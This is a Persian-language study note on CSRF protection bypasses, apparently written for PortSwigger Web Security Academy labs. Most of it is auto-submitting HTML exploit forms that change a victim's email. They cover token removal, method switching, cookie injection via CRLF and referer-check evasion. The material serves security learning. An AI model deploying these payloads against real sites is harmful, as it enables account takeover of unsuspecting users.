# 21.CSRF

روش های بایپس CSRF:

بدون csrf توکن

ضعیف بودن csrf توکن

چک کردن content type

بررسی کردن هدر referer

متود GET به POST یا POST به GET تغییر بدید

روش های بایپس csrf توکن:

حذف ANI-csrf توکن

عدم بررسی توکن کاربران

توکن ضعیف

توکن قابل استفاده مجدد

تغییر ریکوئست متد

توکن قابل حدس

بایپس referer

روش های حمله:

هدر referer حذف کنید و ریکوئست رو ارسال و ریسپانس رو بررسی کنید

هدر های مهم رو حذف کنید و ریکوئست رو ارسال و ریسپانس رو بررسی کنید

سعی کنید csrf توکن رو حذف کنید و ریکوئست رو ارسال و ریسپانس رو بررسی کنید

روش ابتدایی بدون دفاع:

ریکوئست

```
POST /myaccount/changeemail
HOST:

email=....
```

اکسپلویت

```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

اسیب پذیری CSRF که سنجیدن توکن به وجود توکن بستگی داره:

```
POST /myaccount/changeemail
HOST:

email=....&csrftoken=.....
```

نکته: csrf توکن رو در اکسپلیوت حذف کنید

```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

اسیب پذیری CSRF که سنجیدن توکن به ریکوئست متد بستگی داره:

ریکوئست

```
POST /myaccount/changeemail
HOST:

email=....&csrftoken=.....
```

نکته: csrf توکن رو حذف کنید

نکته: تغییر متد ریکوئست به GET در پیلود csrf

```html
<form action="" method="GET">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

اسیب پذیری CSRF که توکن به session کاربر متصل نیست:
مراحل
دو حساب کاربری بسازید

به اولین حساب برید و ایمیل رو تغییر بدید
به حساب دوم برید و تلاش کنید تغییر ایمیل رو intercept کنید سپس ریکوئست رو Drop کنید, توکن csrf رو کپی کنید
به حساب اول برید و توکن csrf (اکانت دوم) رو قرار بدید و ببینید تغییر ایمیل معتبر هست یا نه

بایپس csrf از طریق تغییر دادن متد:

```html
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="" method="GET">
   <input type="hidden" name="_method" value="POST">
   <input type="hidden" name="email" value="">
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

اسیب پذیری CSRF که توکن در کوکی کپی شده:

```html
<html>
<body>
   <script>history.pushState(' ',' ','/')</script>
   <form action="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/my-account/change-email" method="POST"/>
   <input type="hidden" name="email" value="a@gmail.com"/>
   <input type="hidden" name="csrf" value="fake"/>
   <input type="submit" value="submit request"/>
   </form>
   <img src="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   </body>
</html>
```

اسیب پذیری CSRF که سنجیدن Referer به وجود هدر بستگی داره:

```html
<html>
<head>
   <meta name="referrer" content="no-referrer" >
</head>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="https://0a390078039fe0a780e435a600ca0059.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

اسیب پذیری CSRF با سنجیدن broken Referer

```html
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/?0ad4003504bb812580aae57c00c40072.web-security-academy.net')</script>
   <form action="https://0ad4003504bb812580aae57c00c40072.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```